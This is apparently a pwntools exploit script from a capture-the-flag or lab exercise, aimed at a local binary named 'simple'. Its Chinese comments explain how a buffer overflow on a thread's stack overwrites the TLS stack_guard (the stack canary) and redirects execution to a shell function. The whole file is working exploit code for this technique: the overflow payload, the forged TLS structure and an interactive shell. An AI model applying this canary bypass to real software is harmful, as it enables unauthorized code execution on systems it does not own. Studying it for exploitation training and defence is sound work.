from pwn import *

context.arch = 'amd64'
elf = ELF("./simple")
shell = elf.symbols['shell']



r = process('./simple')

gdb.attach(r)
# tcbhead_t 的結構, 請參考 tls 
#              self                 stack_guard
fs = flat(0, elf.bss()+0x800, 0, 0, 'a'*8)
# 執行 system 時, 會在 __spawnix 呼叫 __libc_ptf_call 並跳到 pthread_cancelstate, 裡面 lock 時會用到 self, 所以要放到可寫區段, 而且該位址的值要等於 0 不然 lock 會卡住
# 另外 __libc_ptf_call 是用 call rax 的方式, 且 rax 的值會做 demangle, pointer_guard 為 fs:0x30, 因此最多只能蓋到 fs:0x28, 幸運的是 fs:0x28 剛好是 stack guard

# 由於 thread 的 stack 可以 overflow 到 tls, 所以可透過 bof 蓋掉 stack_guard
# main thread 就不行
r.send(b'a'*0x20 + flat(0, shell+5)+ b'a'*0x808 + fs) 



r.interactive()
